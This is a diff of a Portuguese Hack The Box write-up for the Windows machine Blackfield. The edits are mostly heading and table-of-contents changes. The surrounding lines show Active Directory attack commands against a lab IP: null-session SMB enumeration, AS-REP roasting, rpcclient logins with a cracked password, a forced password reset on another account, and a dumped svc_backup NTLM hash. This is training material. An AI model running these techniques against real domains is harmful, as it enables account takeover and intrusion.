@@ -1,38 +1,39 @@
-1. [Resolução da máquina **Blackfield**](#resolução-da-máquina-blackfield) 1. [Máquina Hard (hackthebox.com)](#máquina-hard-hacktheboxcom) 2. [by **_JavaliMZ_** - 23/09/2021](#by-javalimz---23092021)
-2. [Introdução](#introdução)
-3. [Enumeração](#enumeração)
-    1. [Nmap](#nmap)
-    2. [SMB (anonymous)](#smb-anonymous)
-    3. [AS-REP Roasting Attack](#as-rep-roasting-attack)
-    4. [RPC](#rpc)
-    5. [AS-REP Roasting Attack](#as-rep-roasting-attack-1)
-    6. [Bloodhound](#bloodhound)
-    7. [SMB](#smb)
-4. [PrivEsc svc_backup ==\> Administrator de domínio](#privesc-svc_backup--administrator-de-domínio)
-
 ![](Assets/HTB-Windows-Hard-Blackfield/icon.webp)
 
 <img src="https://img.shields.io/badge/Blackfield-HackTheBox-green?style=plastic" width="200">
 
-# Resolução da máquina **Blackfield**
+<h1> Resolução da máquina <b>Blackfield</b></h1>
 
-#### Máquina Hard (hackthebox.com)
+<h4>Máquina Hard (hackthebox.com)</h4>
 
-#### by **_JavaliMZ_** - 23/09/2021
-
----
+<h4>by <b><i>JavaliMZ</i></b> - 23/09/2021</h4>
 
 ---
 
-# Introdução
+---
+
+- [1. Introdução](#1-introdução)
+- [2. Enumeração](#2-enumeração)
+  - [2.1. Nmap](#21-nmap)
+  - [2.2. SMB (anonymous)](#22-smb-anonymous)
+  - [2.3. AS-REP Roasting Attack](#23-as-rep-roasting-attack)
+  - [2.4. RPC](#24-rpc)
+  - [2.5. AS-REP Roasting Attack](#25-as-rep-roasting-attack)
+  - [2.6. Bloodhound](#26-bloodhound)
+  - [2.7. SMB](#27-smb)
+- [3. PrivEsc svc\_backup ==\> Administrator de domínio](#3-privesc-svc_backup--administrator-de-domínio)
+
+---
+
+# 1. Introdução
 
 Bem-vindo para mais um Writeup, desta vez da máquina Blackfield. É uma máquina Windows não muito complexa, mas bastante interessante. Em diversos passos, irei reduzir o número de usuários porque já sei quais são os importantes e os que posso eliminar, só mesmo para termos outputs mais "cleans" para o writeup. Mas normalmente nunca é bom apagar informações coletadas às cegas...
 
-# Enumeração
+# 2. Enumeração
 
 Como sempre, quando se enfrenta uma máquina, temos de saber por onde vamos entrar. Para isso, temos de enumerar todas as portas abertas da máquina. Iremos utilizar o clássico nmap para esta tarefa.
 
-## Nmap
+## 2.1. Nmap
 
 ```bash
 sudo nmap -sS -p- -n -Pn --min-rate 5000 10.10.10.192 -oG enumeration/allPorts
@@ -97,7 +98,7 @@ nmap -p53,88,135,389,445,593,3268,5985 10.10.10.192 -Pn -sC -sV -oN enumeration/
 
 Pelas portas abertas, podemos concluir que estamos perante um Domain Controller. Não vemos páginas de internet, nem nenhum programa estranho a rodar, portanto parece que esta máquina só trata de problemas que nos podemos enfrentar em Active Directory / Domain Controller. Posto isso, o primeiro ponto que quero é enumerar usuários.
 
-## SMB (anonymous)
+## 2.2. SMB (anonymous)
 
 Antes de tentar ver o que há nas partilhas, vamos tentar sempre conectar por RPC, visto que por esse protocolo é extremamente fácil enumerar todos os usuários, grupos e muito mais...
 
@@ -153,7 +154,7 @@ smbclient \\\\10.10.10.192\\profiles$ -U 'null' -N -c "dir" > contents/users
 cat contents/users | awk '{print$1}' | sponge contents/users
 ```
 
-## AS-REP Roasting Attack
+## 2.3. AS-REP Roasting Attack
 
 Agora que temos todos esses usuários, vamos tentar fazer o clássico AS-REP Roasting Attack, para tentar receber um TGT de um usuário que não precisa de requerer a pre-autenticação kerberos. Para isso, nada mais simples que o programa da impacket GetNPUsers.py
 
@@ -188,7 +189,7 @@ Vemos mais pastas. Mas não há nada de mais... Existe ainda uma pasta partilhad
 
 ![Permissões SMB do usuário support](Assets/HTB-Windows-Hard-Blackfield/smb-support.png)
 
-## RPC
+## 2.4. RPC
 
 Vamos então voltar ao primeiro passo. Enumeração via RPC, mas desta vez, com as credenciais do usuário "support"
 
@@ -218,7 +219,7 @@ rpcclient 10.10.10.192 -U 'support%#00^BlackKnight' -c "enumdomusers" | awk '{pr
 rpcclient 10.10.10.192 -U 'support%#00^BlackKnight' -c "enumdomusers" | awk '{print$1}' | grep -oP "\[.*?\]" | tr -d '[]' | grep -v "BLACKFIELD" > contents/users
 ```
 
-## AS-REP Roasting Attack
+## 2.5. AS-REP Roasting Attack
 
 O novo ataque AS-RES Roasting naõ revela mais nada, apenas mostra outro TGT (porque a data/hora/min/seg é usado para gerar cada TGT) do mesmo usuário "support", mas confirma que todos os outros usuários existem.
 
@@ -236,7 +237,7 @@ Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
 #>  [-] User lydericlefebvre doesn't have UF_DONT_REQUIRE_PREAUTH set
 ```
 
-## Bloodhound
+## 2.6. Bloodhound
 
 Agora que temos acesso ao RPC, e que podemos extrair todas informações públicas a nível de domínio, podemos tratar de gerar uma base de dados para a nossa ferramenta bloodhound, que já usamos em outras máquinas.
 
@@ -261,7 +262,7 @@ rpcclient 10.10.10.192 -U 'support%#00^BlackKnight' -c 'setuserinfo2 Audit2020 2
 crackmapexec smb 10.10.10.192 -u 'Audit2020' -p 'J4v4li123!'
 ```
 
-## SMB
+## 2.7. SMB
 
 Conseguimos alterar a password com sucesso! O nome do usuário Audit2020 é suspeito de ter qualquer coisa a ver com uma das pastas partilhadas que vimos, a forensic! Vamos verificar se temos acesso
 
@@ -326,7 +327,7 @@ Temos um único resultado e já está validado. E para além de válido, está *
 
 > svc_backup:9658d1d1dcd9250115e2205d9f48400d
 
-# PrivEsc svc_backup ==> Administrator de domínio
+# 3. PrivEsc svc_backup ==> Administrator de domínio
 
 ![Evil-WinRM svc_backup](Assets/HTB-Windows-Hard-Blackfield/evil-winrm-svc-backup.png)
 
